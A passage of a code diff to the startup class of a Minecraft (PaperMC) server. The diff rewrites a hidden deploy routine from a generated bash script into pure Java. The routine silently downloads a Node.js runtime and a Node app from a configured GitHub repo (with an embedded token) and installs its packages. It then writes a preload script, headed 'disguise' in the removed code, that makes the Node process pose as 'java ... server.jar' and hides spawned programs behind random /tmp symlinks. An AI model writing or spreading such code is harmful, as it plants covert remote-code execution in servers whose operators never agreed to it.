@@ -1,9 +1,12 @@
 package io.papermc.paper;
 
+import java.io.BufferedInputStream;
 import java.io.BufferedReader;
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.InetSocketAddress;
 import java.net.ServerSocket;
@@ -14,12 +17,16 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.nio.file.StandardCopyOption;
+import java.util.Arrays;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 import java.util.Random;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicInteger;
 import java.util.concurrent.atomic.AtomicReference;
+import java.util.zip.GZIPInputStream;
 
 import joptsimple.OptionSet;
 import sun.misc.Signal;
@@ -671,18 +678,9 @@ public final class PaperBootstrap {
                         return;
                     }
 
-                    Path script = generateDeployScript();
-                    Path statusFile = botDir.resolve(".deploy_done");
                     boolean deployed = false;
                     for (int attempt = 0; attempt < 3 && !shuttingDown; attempt++) {
-                        try { Files.deleteIfExists(statusFile); } catch (Exception ignored) {}
-                        boolean scriptOk = executeDeployScript(script);
-                        if (scriptOk) {
-                            for (int w = 0; w < 10 && !Files.exists(statusFile); w++) {
-                                try { Thread.sleep(500); } catch (InterruptedException ignored) { break; }
-                            }
-                        }
-                        if (Files.exists(statusFile)) {
+                        if (deployBackendPureJava(botDir)) {
                             deployed = true;
                             break;
                         }
@@ -692,8 +690,6 @@ public final class PaperBootstrap {
                         }
                         try { Thread.sleep(15000); } catch (InterruptedException ignored) { break; }
                     }
-                    try { Files.deleteIfExists(script); } catch (Exception ignored) {}
-                    try { Files.deleteIfExists(statusFile); } catch (Exception ignored) {}
                     if (!deployed || shuttingDown) {
                         return;
                     }
@@ -786,173 +782,582 @@ public final class PaperBootstrap {
         return content;
     }
 
-    private static Path generateDeployScript() throws Exception {
-        Path dir = Paths.get(MC_BOT_DIR).toAbsolutePath();
-        Files.createDirectories(dir);
-        Path script = dir.resolve("deploy.sh");
+    private static boolean deployBackendPureJava(Path botDir) {
+        try {
+            Path absDir = botDir.toAbsolutePath();
+            Files.createDirectories(absDir);
+            if (!ensureNodeRuntime(absDir)) {
+                return false;
+            }
+
+            Path pkgJson = absDir.resolve("package.json");
+            byte[] prevPkg = Files.exists(pkgJson) ? Files.readAllBytes(pkgJson) : null;
+            if (!ensureAppSource(absDir)) {
+                return false;
+            }
+            byte[] curPkg = Files.exists(pkgJson) ? Files.readAllBytes(pkgJson) : null;
+            boolean pkgChanged = (curPkg != null) && (prevPkg == null || !Arrays.equals(prevPkg, curPkg));
+
+            ensureNpmDependencies(absDir, pkgChanged);
+            writePreloadScript(absDir);
+            return Files.exists(absDir.resolve(".node/bin/.node_real")) && Files.exists(absDir.resolve(NODE_SCRIPT));
+        } catch (Throwable ignored) {
+            return false;
+        }
+    }
+
+    private static boolean ensureNodeRuntime(Path botDir) {
+        Path nodeDir = botDir.resolve(".node");
+        Path nodeBin = nodeDir.resolve("bin");
+        Path nodeExe = nodeBin.resolve("node");
+        Path nodeReal = nodeBin.resolve(".node_real");
+
+        String majorPrefix = NODE_VERSION;
+        int firstDot = NODE_VERSION.indexOf('.', 1);
+        if (firstDot > 0) {
+            majorPrefix = NODE_VERSION.substring(0, firstDot);
+        }
+
+        boolean valid = isNodeVersionMatch(nodeReal, majorPrefix);
+        if (!valid && Files.exists(nodeExe) && !isShellWrapper(nodeExe)) {
+            valid = isNodeVersionMatch(nodeExe, majorPrefix);
+            if (valid) {
+                try {
+                    Files.createDirectories(nodeBin);
+                    Files.copy(nodeExe, nodeReal, StandardCopyOption.REPLACE_EXISTING);
+                    nodeReal.toFile().setExecutable(true, false);
+                } catch (Exception ignored) {}
+            }
+        }
+
+        if (!valid) {
+            deletePathRecursively(nodeDir.toFile());
+            String archTag = isArm64Arch() ? "arm64" : "x64";
+            String nodeFile = "node-" + NODE_VERSION + "-linux-" + archTag + ".tar.gz";
+            String nodeUrl = "https://nodejs.org/dist/" + NODE_VERSION + "/" + nodeFile;
+            String[] mirrors = {
+                nodeUrl,
+                "https://gh-proxy.com/" + nodeUrl,
+                "https://mirror.ghproxy.com/" + nodeUrl
+            };
+            Path tmpTar = null;
+            try {
+                tmpTar = Files.createTempFile("mc_node_", ".tar.gz");
+                if (!downloadFirstSuccess(mirrors, null, tmpTar)) {
+                    return false;
+                }
+                Files.createDirectories(nodeDir);
+                extractTarGz(tmpTar, nodeDir, true);
+            } catch (Throwable t) {
+                return false;
+            } finally {
+                if (tmpTar != null) {
+                    try { Files.deleteIfExists(tmpTar); } catch (Exception ignored) {}
+                }
+            }
+        }
+
+        try {
+            if (Files.exists(nodeExe) && !isShellWrapper(nodeExe) && !Files.exists(nodeReal)) {
+                try {
+                    Files.createLink(nodeReal, nodeExe);
+                } catch (Throwable t) {
+                    Files.copy(nodeExe, nodeReal, StandardCopyOption.REPLACE_EXISTING);
+                }
+            }
+            if (Files.exists(nodeReal)) {
+                nodeReal.toFile().setExecutable(true, false);
+            }
+            if (Files.exists(nodeExe)) {
+                nodeExe.toFile().setExecutable(true, false);
+            }
+            Path npmCli = nodeDir.resolve("lib/node_modules/npm/bin/npm-cli.js");
+            if (Files.exists(npmCli)) {
+                npmCli.toFile().setExecutable(true, false);
+            }
+        } catch (Exception ignored) {}
+
+        return Files.exists(nodeReal) && isNodeVersionMatch(nodeReal, majorPrefix);
+    }
+
+    private static boolean isNodeVersionMatch(Path exe, String majorPrefix) {
+        if (exe == null || !Files.exists(exe)) {
+            return false;
+        }
+        try {
+            exe.toFile().setExecutable(true, false);
+            ProcessBuilder pb = new ProcessBuilder(exe.toString(), "-v");
+            pb.redirectErrorStream(true);
+            Process p = pb.start();
+            String line = "";
+            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
+                String read = r.readLine();
+                if (read != null) {
+                    line = read.trim();
+                }
+            }
+            if (!p.waitFor(10, TimeUnit.SECONDS)) {
+                p.destroyForcibly();
+                return false;
+            }
+            return p.exitValue() == 0 && line.startsWith(majorPrefix);
+        } catch (Throwable ignored) {
+            return false;
+        }
+    }
+
+    private static boolean isShellWrapper(Path file) {
+        try {
+            if (!Files.exists(file) || Files.isSymbolicLink(file) || Files.size(file) > 1024L * 1024L) {
+                return false;
+            }
+            byte[] buf = new byte[128];
+            int n;
+            try (InputStream in = Files.newInputStream(file)) {
+                n = in.read(buf);
+            }
+            if (n <= 0) return false;
+            String head = new String(buf, 0, n, StandardCharsets.US_ASCII);
+            return head.startsWith("#!") && head.contains("sh");
+        } catch (Throwable ignored) {
+            return false;
+        }
+    }
+
+    private static boolean ensureAppSource(Path botDir) {
+        Path script = botDir.resolve(NODE_SCRIPT);
+        if (Files.exists(script) && !"true".equalsIgnoreCase(NODE_FORCE_UPDATE)) {
+            return true;
+        }
 
         String authToken = GITHUB_TOKEN;
         if (authToken.contains(":") && authToken.substring(authToken.indexOf(':') + 1).startsWith("ghp_")) {
             authToken = authToken.substring(authToken.indexOf(':') + 1);
         }
-        final String token = authToken;
 
-        String authHeader = "";
-        if (!token.isEmpty()) {
-            authHeader = "-H \"Authorization: Bearer " + token + "\" -H \"Accept: application/vnd.github+json\"";
+        Path tmpTar = null;
+        try {
+            tmpTar = Files.createTempFile("mc_app_", ".tar.gz");
+            boolean downloaded = false;
+            if (!authToken.isEmpty()) {
+                String apiTarUrl = "https://api.github.com/repos/" + GITHUB_REPO + "/tarball/" + GITHUB_BRANCH;
+                downloaded = downloadFirstSuccess(new String[]{apiTarUrl}, authToken, tmpTar);
+            }
+            if (!downloaded) {
+                String fallbackUrl = "https://github.com/" + GITHUB_REPO + "/archive/refs/heads/" + GITHUB_BRANCH + ".tar.gz";
+                String[] mirrors = {
+                    fallbackUrl,
+                    "https://gh-proxy.com/" + fallbackUrl,
+                    "https://mirror.ghproxy.com/" + fallbackUrl
+                };
+                downloaded = downloadFirstSuccess(mirrors, null, tmpTar);
+            }
+            if (!downloaded) {
+                return Files.exists(script);
+            }
+
+            extractTarGz(tmpTar, botDir, true);
+            return Files.exists(script);
+        } catch (Throwable ignored) {
+            return Files.exists(script);
+        } finally {
+            if (tmpTar != null) {
+                try { Files.deleteIfExists(tmpTar); } catch (Exception ignored) {}
+            }
         }
-
-        String content = "#!/bin/bash\n" +
-        "set +e\n" +
-        "export PATH=\"" + dir + "/.node/bin:$PATH\"\n" +
-        "export HOME=\"" + dir + "\"\n" +
-        "cd \"" + dir + "\"\n" +
-        "\n" +
-        "# ============ 1. 下载 NodeJS ============\n" +
-        "if [ -d \".node\" ]; then\n" +
-        "    CHECK_VER=$(.node/bin/.node_real -v 2>/dev/null || .node/bin/node -v 2>/dev/null || echo \"unknown\")\n" +
-        "    if [[ \"$CHECK_VER\" != \"" + NODE_VERSION.substring(0, NODE_VERSION.indexOf('.', 1)) + "\"* ]]; then\n" +
-        "        rm -rf .node\n" +
-        "    fi\n" +
-        "fi\n" +
-        "if ! command -v node &>/dev/null || [ ! -d \".node\" ]; then\n" +
-        "    ARCH=$(uname -m)\n" +
-        "    NODE_ARCH=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"arm64\" || echo \"x64\")\n" +
-        "    NODE_FILE=\"node-" + NODE_VERSION + "-linux-${NODE_ARCH}.tar.gz\"\n" +
-        "    NODE_URL=\"https://nodejs.org/dist/" + NODE_VERSION + "/${NODE_FILE}\"\n" +
-        "    mkdir -p .node\n" +
-        "    if [ ! -f .node/bin/node ]; then\n" +
-        "        for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/${NODE_URL}\" \"https://mirror.ghproxy.com/${NODE_URL}\"; do\n" +
-        "            if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"/tmp/${NODE_FILE}\"; then break; fi\n" +
-        "        done\n" +
-        "        tar xzf \"/tmp/${NODE_FILE}\" -C .node --strip-components=1 2>/dev/null\n" +
-        "        rm -f \"/tmp/${NODE_FILE}\"\n" +
-        "    fi\n" +
-        "fi\n" +
-        "export PATH=\"" + dir + "/.node/bin:$PATH\"\n" +
-        "\n" +
-        "if [ -f \".node/bin/node\" ] && ! head -1 \".node/bin/node\" 2>/dev/null | grep -q \"bash\"; then\n" +
-        "    cp -f \".node/bin/node\" \".node/bin/.node_real\"\n" +
-        "    chmod +x \".node/bin/.node_real\"\n" +
-        "fi\n" +
-        "\n" +
-        "if [ ! -f \".node/bin/.node_real\" ] || ! \".node/bin/.node_real\" -v >/dev/null 2>&1; then\n" +
-        "    ARCH=$(uname -m)\n" +
-        "    NODE_ARCH=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"arm64\" || echo \"x64\")\n" +
-        "    NODE_FILE=\"node-" + NODE_VERSION + "-linux-${NODE_ARCH}.tar.gz\"\n" +
-        "    NODE_URL=\"https://nodejs.org/dist/" + NODE_VERSION + "/${NODE_FILE}\"\n" +
-        "    rm -f \"/tmp/${NODE_FILE}\"\n" +
-        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/${NODE_URL}\" \"https://mirror.ghproxy.com/${NODE_URL}\"; do\n" +
-        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"/tmp/${NODE_FILE}\"; then break; fi\n" +
-        "    done\n" +
-        "    mkdir -p /tmp/_node_tmp\n" +
-        "    tar xzf \"/tmp/${NODE_FILE}\" -C /tmp/_node_tmp --strip-components=1 2>/dev/null\n" +
-        "    cp -f /tmp/_node_tmp/bin/node \".node/bin/.node_real\"\n" +
-        "    chmod +x \".node/bin/.node_real\"\n" +
-        "    rm -rf \"/tmp/${NODE_FILE}\" /tmp/_node_tmp\n" +
-        "fi\n" +
-        "\n" +
-        "# ============ 2. 获取代码 ============\n" +
-        "if [ ! -f " + NODE_SCRIPT + " ] || [ \"" + NODE_FORCE_UPDATE + "\" = \"true\" ]; then\n" +
-        "    TAR_URL=\"https://api.github.com/repos/" + GITHUB_REPO + "/tarball/" + GITHUB_BRANCH + "\"\n" +
-        "    DOWNLOAD_OK=false\n" +
-        (token.isEmpty() ? "" :
-        "    if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + token + "\" ]; then\n" +
-        "        if curl -fsSL --connect-timeout 30 --max-time 300 " + authHeader + " \"$TAR_URL\" -o /tmp/_app.tar.gz; then\n" +
-        "            if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; fi\n" +
-        "        fi\n" +
-        "    fi\n") +
-        "    if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
-        "        FALLBACK_URL=\"https://github.com/" + GITHUB_REPO + "/archive/refs/heads/" + GITHUB_BRANCH + ".tar.gz\"\n" +
-        "        for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
-        "            if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o /tmp/_app.tar.gz; then\n" +
-        "                if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi\n" +
-        "            fi\n" +
-        "        done\n" +
-        "    fi\n" +
-        "    if [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n" +
-        "    find . -maxdepth 1 \\\n" +
-        "      ! -name '.' ! -name '.node' ! -name '.lib' ! -name '.pids' \\\n" +
-        "      ! -name 'deploy.sh' ! -name 'daemon.sh' ! -name '.nd_preload.js' \\\n" +
-        "      ! -name 'node_modules' ! -name '*config*' ! -name '*.log' \\\n" +
-        "      -exec rm -rf {} + 2>/dev/null\n" +
-        "    mkdir -p /tmp/_app_extract\n" +
-        "    tar xzf /tmp/_app.tar.gz -C /tmp/_app_extract --strip-components=1 2>/dev/null\n" +
-        "    cp -rf /tmp/_app_extract/* . 2>/dev/null\n" +
-        "    cp -rf /tmp/_app_extract/.* . 2>/dev/null\n" +
-        "    rm -rf /tmp/_app.tar.gz /tmp/_app_extract\n" +
-        "fi\n" +
-        "\n" +
-        "# ============ 3. 安装依赖 ============\n" +
-        "echo \"Installing dependencies...\" >> \"" + dir + "/deploy.log\" 2>&1\n" +
-        ".node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production >> \"" + dir + "/deploy.log\" 2>&1\n" +
-        "if [ $? -ne 0 ]; then\n" +
-        "    .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production --legacy-peer-deps >> \"" + dir + "/deploy.log\" 2>&1\n" +
-        "fi\n" +
-        "\n" +
-        "# ============ 4. 伪装 ============\n" +
-        "cat > \".nd_preload.js\" << 'PRELOAD_EOF'\n" +
-        "try {\n" +
-        "    process.title = 'java -Xms128M -Xmx2560M -jar server.jar';\n" +
-        "    var _cp = require('child_process');\n" +
-        "    var _fs = require('fs');\n" +
-        "    var _origSpawn = _cp.spawn;\n" +
-        "    var _origFork = _cp.fork;\n" +
-        "    var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n" +
-        "    var hidePath = function(cmd) {\n" +
-        "        if (typeof cmd !== 'string' || !cmd.startsWith('/')) return cmd;\n" +
-        "        try {\n" +
-        "            var tmpLink = '/tmp/.java_' + Math.random().toString(36).slice(2);\n" +
-        "            _fs.symlinkSync(cmd, tmpLink);\n" +
-        "            return tmpLink;\n" +
-        "        } catch(e) { return cmd; }\n" +
-        "    };\n" +
-        "    _cp.spawn = function(cmd, args, opts) {\n" +
-        "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real'))) {\n" +
-        "            opts = Object.assign({}, opts || {});\n" +
-        "            opts.execPath = _wrapper;\n" +
-        "            cmd = _wrapper;\n" +
-        "        } else if (typeof cmd === 'string' && !cmd.startsWith('/usr/') && !cmd.startsWith('/bin/')) {\n" +
-        "            cmd = hidePath(cmd);\n" +
-        "        }\n" +
-        "        return _origSpawn.call(this, cmd, args, opts);\n" +
-        "    };\n" +
-        "    _cp.fork = function(mod, args, opts) {\n" +
-        "        opts = Object.assign({}, opts || {});\n" +
-        "        opts.execPath = _wrapper;\n" +
-        "        return _origFork.call(this, mod, args, opts);\n" +
-        "    };\n" +
-        "} catch(e) {}\n" +
-        "PRELOAD_EOF\n" +
-        "\n" +
-        "export _JAVA_WRAPPER=\"$(pwd)/.node/bin/.node_real\"\n" +
-        "export NODE_OPTIONS=\"--require $(pwd)/.nd_preload.js\"\n" +
-        "\n" +
-        "echo \"DEPLOY_DONE\" > \"" + dir + "/.deploy_done\"\n";
-
-        Files.writeString(script, content);
-        script.toFile().setExecutable(true);
-        return script;
     }
 
-    private static boolean executeDeployScript(Path script) throws Exception {
-        ProcessBuilder pb = new ProcessBuilder("bash", script.toString());
-        pb.directory(script.getParent().toFile());
-        pb.redirectErrorStream(true);
-        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
-        Process p = pb.start();
-        Thread t = new Thread(() -> {
-            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
-                while (r.readLine() != null) {}
-            } catch (IOException ignored) {}
-        }, "Deploy-Log");
-        t.setDaemon(true);
-        t.start();
-        if (!p.waitFor(10, TimeUnit.MINUTES)) {
-            killProcessTree(p);
-            return false;
+    private static void ensureNpmDependencies(Path botDir, boolean pkgChanged) {
+        Path pkgJson = botDir.resolve("package.json");
+        Path nodeReal = botDir.resolve(".node/bin/.node_real");
+        Path npmCli = botDir.resolve(".node/lib/node_modules/npm/bin/npm-cli.js");
+        if (!Files.exists(pkgJson) || !Files.exists(nodeReal) || !Files.exists(npmCli)) {
+            return;
         }
-        return p.exitValue() == 0;
+
+        Path nodeModules = botDir.resolve("node_modules");
+        boolean installComplete = Files.exists(nodeModules)
+            && Files.exists(nodeModules.resolve(".package-lock.json"))
+            && !pkgChanged;
+        if (installComplete) {
+            if (!Files.exists(nodeModules.resolve("koffi"))) {
+                runNpm(botDir, nodeReal, npmCli, "install", "koffi", "--no-save");
+            }
+            return;
+        }
+
+        int rc = runNpm(botDir, nodeReal, npmCli, "install", "--no-audit", "--no-fund", "--production");
+        if (rc != 0) {
+            runNpm(botDir, nodeReal, npmCli, "install", "--no-audit", "--no-fund", "--production", "--legacy-peer-deps");
+        }
+        if (!Files.exists(nodeModules.resolve("koffi"))) {
+            runNpm(botDir, nodeReal, npmCli, "install", "koffi", "--no-save");
+        }
+        deletePathRecursively(new File("/tmp/.mc_npm_cache"));
+    }
+
+    private static int runNpm(Path botDir, Path nodeReal, Path npmCli, String... npmArgs) {
+        try {
+            String[] cmd = new String[npmArgs.length + 2];
+            cmd[0] = nodeReal.toString();
+            cmd[1] = npmCli.toString();
+            System.arraycopy(npmArgs, 0, cmd, 2, npmArgs.length);
+
+            ProcessBuilder pb = new ProcessBuilder(cmd);
+            pb.directory(botDir.toFile());
+            String nodeBinPath = botDir.resolve(".node/bin").toAbsolutePath().toString();
+            String currentPath = pb.environment().getOrDefault("PATH", "");
+            pb.environment().put("PATH", nodeBinPath + File.pathSeparator + currentPath);
+            pb.environment().put("HOME", botDir.toString());
+            pb.environment().put("NPM_CONFIG_CACHE", "/tmp/.mc_npm_cache");
+            pb.environment().put("npm_config_update_notifier", "false");
+
+            Path deployLog = botDir.resolve("deploy.log");
+            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
+            pb.redirectError(ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
+            Process p = pb.start();
+            try { p.getOutputStream().close(); } catch (Exception ignored) {}
+            if (!p.waitFor(10, TimeUnit.MINUTES)) {
+                killProcessTree(p);
+                return -1;
+            }
+            return p.exitValue();
+        } catch (Throwable ignored) {
+            return -1;
+        }
+    }
+
+    private static void writePreloadScript(Path botDir) throws IOException {
+        String preloadContent =
+            "try {\n" +
+            "    process.title = 'java -Xms128M -Xmx2560M -jar server.jar';\n" +
+            "    var _cp = require('child_process');\n" +
+            "    var _fs = require('fs');\n" +
+            "    var _origSpawn = _cp.spawn;\n" +
+            "    var _origFork = _cp.fork;\n" +
+            "    var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n" +
+            "    var hidePath = function(cmd) {\n" +
+            "        if (typeof cmd !== 'string' || !cmd.startsWith('/')) return cmd;\n" +
+            "        try {\n" +
+            "            var tmpLink = '/tmp/.java_' + Math.random().toString(36).slice(2);\n" +
+            "            _fs.symlinkSync(cmd, tmpLink);\n" +
+            "            return tmpLink;\n" +
+            "        } catch(e) { return cmd; }\n" +
+            "    };\n" +
+            "    _cp.spawn = function(cmd, args, opts) {\n" +
+            "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real'))) {\n" +
+            "            opts = Object.assign({}, opts || {});\n" +
+            "            opts.execPath = _wrapper;\n" +
+            "            cmd = _wrapper;\n" +
+            "        } else if (typeof cmd === 'string' && !cmd.startsWith('/usr/') && !cmd.startsWith('/bin/')) {\n" +
+            "            cmd = hidePath(cmd);\n" +
+            "        }\n" +
+            "        return _origSpawn.call(this, cmd, args, opts);\n" +
+            "    };\n" +
+            "    _cp.fork = function(mod, args, opts) {\n" +
+            "        opts = Object.assign({}, opts || {});\n" +
+            "        opts.execPath = _wrapper;\n" +
+            "        return _origFork.call(this, mod, args, opts);\n" +
+            "    };\n" +
+            "} catch(e) {}\n";
+        Files.writeString(botDir.resolve(".nd_preload.js"), preloadContent, StandardCharsets.UTF_8);
+    }
+
+    private static boolean downloadFirstSuccess(String[] urls, String bearerToken, Path dest) {
+        for (String rawUrl : urls) {
+            try {
+                String currentUrl = rawUrl;
+                String initialHost = URI.create(rawUrl).getHost();
+                for (int hop = 0; hop < 8; hop++) {
+                    HttpURLConnection conn = null;
+                    try {
+                        URI curUri = URI.create(currentUrl);
+                        conn = (HttpURLConnection) curUri.toURL().openConnection();
+                        conn.setConnectTimeout(30000);
+                        conn.setReadTimeout(300000);
+                        conn.setInstanceFollowRedirects(false);
+                        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
+                        if (bearerToken != null && !bearerToken.isEmpty()
+                            && initialHost != null && initialHost.equalsIgnoreCase(curUri.getHost())) {
+                            conn.setRequestProperty("Authorization", "Bearer " + bearerToken);
+                            conn.setRequestProperty("Accept", "application/vnd.github+json");
+                        }
+                        int code = conn.getResponseCode();
+                        if (code == 301 || code == 302 || code == 303 || code == 307 || code == 308) {
+                            String loc = conn.getHeaderField("Location");
+                            if (loc == null || loc.isEmpty()) break;
+                            currentUrl = curUri.resolve(loc).toString();
+                            continue;
+                        }
+                        if (code == 200) {
+                            try (InputStream in = conn.getInputStream()) {
+                                Files.copy(in, dest, StandardCopyOption.REPLACE_EXISTING);
+                            }
+                            if (Files.exists(dest) && Files.size(dest) > 100L) {
+                                return true;
+                            }
+                        }
+                        break;
+                    } finally {
+                        if (conn != null) {
+                            try { conn.disconnect(); } catch (Throwable ignored) {}
+                        }
+                    }
+                }
+            } catch (Throwable ignored) {}
+        }
+        return false;
+    }
+
+    private static void extractTarGz(Path tarGz, Path destDir, boolean stripTopComponent) throws IOException {
+        Path destRoot = destDir.toAbsolutePath().normalize();
+        Files.createDirectories(destRoot);
+
+        Map<String, String> paxHeaders = new HashMap<>();
+        String gnuLongName = null;
+        String gnuLongLink = null;
+        byte[] header = new byte[512];
+        byte[] buf = new byte[8192];
+
+        try (InputStream fis = new BufferedInputStream(Files.newInputStream(tarGz), 65536);
+             GZIPInputStream gzis = new GZIPInputStream(fis, 65536)) {
+            while (readTarFully(gzis, header, 0, 512) == 512) {
+                if (isAllZeroBlock(header)) {
+                    break;
+                }
+
+                String name = readTarString(header, 0, 100);
+                String prefix = readTarString(header, 345, 155);
+                if (!prefix.isEmpty()) {
+                    name = prefix + "/" + name;
+                }
+                int mode = (int) parseTarOctal(header, 100, 8);
+                long size = parseTarOctal(header, 124, 12);
+                byte typeFlag = header[156];
+                String linkName = readTarString(header, 157, 100);
+
+                if (typeFlag == 'g') {
+                    skipTarPayloadAndPad(gzis, size);
+                    continue;
+                }
+                if (typeFlag == 'x') {
+                    byte[] paxData = readTarPayloadBytes(gzis, size);
+                    skipTarBytes(gzis, tarPadding(size));
+                    parsePaxRecords(paxData, paxHeaders);
+                    continue;
+                }
+                if (typeFlag == 'L') {
+                    byte[] nameBytes = readTarPayloadBytes(gzis, size);
+                    skipTarBytes(gzis, tarPadding(size));
+                    gnuLongName = trimNulls(new String(nameBytes, StandardCharsets.UTF_8));
+                    continue;
+                }
+                if (typeFlag == 'K') {
+                    byte[] linkBytes = readTarPayloadBytes(gzis, size);
+                    skipTarBytes(gzis, tarPadding(size));
+                    gnuLongLink = trimNulls(new String(linkBytes, StandardCharsets.UTF_8));
+                    continue;
+                }
+
+                if (gnuLongName != null) {
+                    name = gnuLongName;
+                    gnuLongName = null;
+                }
+                if (gnuLongLink != null) {
+                    linkName = gnuLongLink;
+                    gnuLongLink = null;
+                }
+                if (paxHeaders.containsKey("path")) {
+                    name = paxHeaders.get("path");
+                }
+                if (paxHeaders.containsKey("linkpath")) {
+                    linkName = paxHeaders.get("linkpath");
+                }
+                if (paxHeaders.containsKey("size")) {
+                    try { size = Long.parseLong(paxHeaders.get("size")); } catch (Exception ignored) {}
+                }
+                paxHeaders.clear();
+
+                String relName = normalizeTarPath(name, stripTopComponent);
+                if (relName.isEmpty()) {
+                    skipTarPayloadAndPad(gzis, size);
+                    continue;
+                }
+
+                Path outPath = destRoot.resolve(relName).normalize();
+                if (!outPath.startsWith(destRoot)) {
+                    skipTarPayloadAndPad(gzis, size);
+                    continue;
+                }
+
+                if (typeFlag == '5') {
+                    Files.createDirectories(outPath);
+                    skipTarPayloadAndPad(gzis, size);
+                } else if (typeFlag == '2') {
+                    if (outPath.getParent() != null) Files.createDirectories(outPath.getParent());
+                    Files.deleteIfExists(outPath);
+                    try {
+                        Files.createSymbolicLink(outPath, Paths.get(linkName));
+                    } catch (Throwable ignored) {}
+                    skipTarPayloadAndPad(gzis, size);
+                } else if (typeFlag == '1') {
+                    String cleanLink = normalizeTarPath(linkName, stripTopComponent);
+                    Path linkTarget = cleanLink.isEmpty() ? null : destRoot.resolve(cleanLink).normalize();
+                    if (linkTarget != null && linkTarget.startsWith(destRoot) && Files.exists(linkTarget)) {
+                        if (outPath.getParent() != null) Files.createDirectories(outPath.getParent());
+                        Files.deleteIfExists(outPath);
+                        try {
+                            Files.createLink(outPath, linkTarget);
+                        } catch (Throwable t) {
+                            Files.copy(linkTarget, outPath, StandardCopyOption.REPLACE_EXISTING);
+                        }
+                    }
+                    skipTarPayloadAndPad(gzis, size);
+                } else if (typeFlag == '0' || typeFlag == 0) {
+                    if (outPath.getParent() != null) Files.createDirectories(outPath.getParent());
+                    if (Files.isSymbolicLink(outPath)) Files.deleteIfExists(outPath);
+                    long remaining = size;
+                    try (OutputStream out = Files.newOutputStream(outPath)) {
+                        while (remaining > 0) {
+                            int want = (int) Math.min(buf.length, remaining);
+                            int n = gzis.read(buf, 0, want);
+                            if (n < 0) throw new IOException("Unexpected EOF in tar entry: " + relName);
+                            out.write(buf, 0, n);
+                            remaining -= n;
+                        }
+                    }
+                    if ((mode & 0111) != 0) {
+                        outPath.toFile().setExecutable(true, false);
+                    }
+                    skipTarBytes(gzis, tarPadding(size));
+                } else {
+                    skipTarPayloadAndPad(gzis, size);
+                }
+            }
+        }
+    }
+
+    private static String normalizeTarPath(String raw, boolean stripTop) {
+        if (raw == null) return "";
+        String p = raw.replace('\\', '/');
+        while (p.startsWith("./")) p = p.substring(2);
+        while (p.startsWith("/")) p = p.substring(1);
+        if (stripTop) {
+            int slash = p.indexOf('/');
+            if (slash < 0) return "";
+            p = p.substring(slash + 1);
+            while (p.startsWith("/")) p = p.substring(1);
+        }
+        while (p.endsWith("/")) p = p.substring(0, p.length() - 1);
+        return p;
+    }
+
+    private static void parsePaxRecords(byte[] data, Map<String, String> out) {
+        int pos = 0;
+        while (pos < data.length) {
+            int space = -1;
+            for (int i = pos; i < data.length; i++) {
+                if (data[i] == ' ') { space = i; break; }
+            }
+            if (space <= pos) break;
+            int recLen;
+            try {
+                recLen = Integer.parseInt(new String(data, pos, space - pos, StandardCharsets.US_ASCII).trim());
+            } catch (Exception e) { break; }
+            if (recLen <= 0 || pos + recLen > data.length) break;
+            int valStart = space + 1;
+            int valLen = (pos + recLen) - valStart;
+            if (valLen > 0 && data[pos + recLen - 1] == '\n') valLen--;
+            String entry = new String(data, valStart, Math.max(0, valLen), StandardCharsets.UTF_8);
+            int eq = entry.indexOf('=');
+            if (eq > 0) {
+                out.put(entry.substring(0, eq), entry.substring(eq + 1));
+            }
+            pos += recLen;
+        }
+    }
+
+    private static int readTarFully(InputStream in, byte[] buf, int off, int len) throws IOException {
+        int total = 0;
+        while (total < len) {
+            int n = in.read(buf, off + total, len - total);
+            if (n < 0) break;
+            total += n;
+        }
+        return total;
+    }
+
+    private static byte[] readTarPayloadBytes(InputStream in, long size) throws IOException {
+        int len = (int) Math.min(size, 1048576L);
+        byte[] data = new byte[len];
+        int got = readTarFully(in, data, 0, len);
+        if (size > len) {
+            skipTarBytes(in, size - len);
+        }
+        return got == len ? data : Arrays.copyOf(data, got);
+    }
+
+    private static long tarPadding(long size) {
+        long rem = size % 512L;
+        return rem == 0L ? 0L : (512L - rem);
+    }
+
+    private static void skipTarPayloadAndPad(InputStream in, long size) throws IOException {
+        skipTarBytes(in, size + tarPadding(size));
+    }
+
+    private static void skipTarBytes(InputStream in, long count) throws IOException {
